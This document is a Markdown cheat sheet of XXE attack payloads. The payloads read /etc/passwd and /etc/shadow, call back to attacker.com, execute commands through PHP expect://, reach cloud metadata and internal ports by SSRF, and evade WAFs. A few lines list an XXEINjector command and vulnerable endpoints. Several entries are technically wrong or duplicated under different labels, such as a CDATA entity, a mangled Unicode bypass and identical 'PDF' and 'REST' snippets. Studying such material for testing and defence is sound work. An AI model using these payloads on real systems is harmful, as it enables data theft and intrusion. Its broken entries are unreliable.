# XXE (XML External Entity) Payloads

## Basic XXE

### Simple entity
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### External entity
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/test">]>
<foo>&xxe;</foo>
```

### File read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

## Blind XXE

### Out-of-band detection
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?q=test">]>
<foo>&xxe;</foo>
```

### Parameter entity
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/?q=%">]>
%xxe;
```

### Error-based
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>[%xxe;]</foo>
```

## XXE to RCE

### PHP expect wrapper
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<foo>&xxe;</foo>
```

### PHP wrapper
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<foo>&xxe;</foo>
```

## XXE in File Upload

### SVG (often allowed in file uploads)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg><rect width="100" height="100">&xxe;</rect></svg>
```

### PDF with XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### Word (.docx) - document.xml
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

## XXE for SSRF

### Internal port scanning
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:22">]>
<foo>&xxe;</foo>
```

### Cloud metadata
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

### Internal service access
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service:8080">]>
<foo>&xxe;</foo>
```

## XInclude Attacks

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## Document type decomposition

### Classic
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### Parameter entity
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">]>
%xxe;
```

### CDATA wrapper
```xml
<!DOCTYPE foo [<!ENTITY xxe <![CDATA[ /etc/passwd ]]>]>
<foo>&xxe;</foo>
```

## WAF Bypass Techniques

### CDATA injection
```xml
<foo><![CDATA[<!ENTITY xxe SYSTEM "file:///etc/passwd">]]></foo>
```

### Unicode绕过
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "fi\u007Ce:///etc/passwd">]>
```

### Encoding
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///&#101;tc/&#112;asswd">]>
```

### Multi-root entity
```xml
<!DOCTYPE foo [
  <!ENTITY xxe1 SYSTEM "file:///etc/passwd">
  <!ENTITY xxe2 SYSTEM "file:///etc/shadow">
]>
<foo>&xxe1;&xxe2;</foo>
```

## SOAP XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <foo>&xxe;</foo>
  </soap:Body>
</soap:Envelope>
```

## REST XXE

### JSON with XML
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

## XXE Detection Checklist

| Test | Expected |
|------|----------|
| File read | `/etc/passwd` in response |
| External HTTP | Callback to your server |
| Port scan | Different response for open vs closed port |
| Error leak | Error message reveals content |

## Common Vulnerable Endpoints

```
/api/xml
/xml
/soap
/services
/webservices
/upload
/post
```

## Tool: XXEINjector

```bash
# Usage
ruby XXEINJECTOR.rb --host attacker.com --path /path/to/victim --file request.xml
```

## XXE + SSRF Cheat Sheet

| Target | Payload |
|--------|---------|
| Read file | `file:///etc/passwd` |
| HTTP to attacker | `http://attacker.com/` |
| Cloud meta (AWS) | `http://169.254.169.254/latest/meta-data/` |
| Cloud meta (GCP) | `http://metadata.google.internal/` |
| Internal port | `http://localhost:22` |
| Internal scan | `http://192.168.1.1:8080` |